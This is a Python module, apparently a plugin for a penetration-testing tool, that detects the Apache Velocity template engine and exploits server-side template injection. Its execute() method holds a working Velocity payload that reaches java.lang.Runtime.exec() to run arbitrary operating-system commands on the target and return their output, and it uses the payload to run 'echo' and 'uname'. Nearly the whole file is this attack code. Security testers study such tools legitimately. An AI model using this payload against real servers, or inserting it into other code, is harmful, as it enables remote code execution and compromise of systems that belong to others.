from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Velocity(Check):

    render_tag = '#set($p=%(payload)s)\n$p\n'
    header_tag = '#set($h=%(header)s)\n$h\n'
    trailer_tag = '\n#set($t=%(trailer)s)\n$t'
    contexts = [ ]
        
    def detect_engine(self):

        expected_rand = str(rand.randint_n(1))
        payload = '#set($p=%(payload)s)\n$p\n' % ({ 'payload': expected_rand })

        if expected_rand == self.inject(payload):
            self.set('language', 'java')
            self.set('engine', 'velocity')

   # I've tested the techniques described in this article
   # http://blog.portswigger.net/2015/08/server-side-template-injection.html
   # for it didn't work. Still keeping the check active to cover previous
   # affected versions.

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)
            self.set('os', self.execute("uname"))

    def execute(self, command):

        # TODO: quote command
        return self.inject("""#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("%s"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end""" % (command))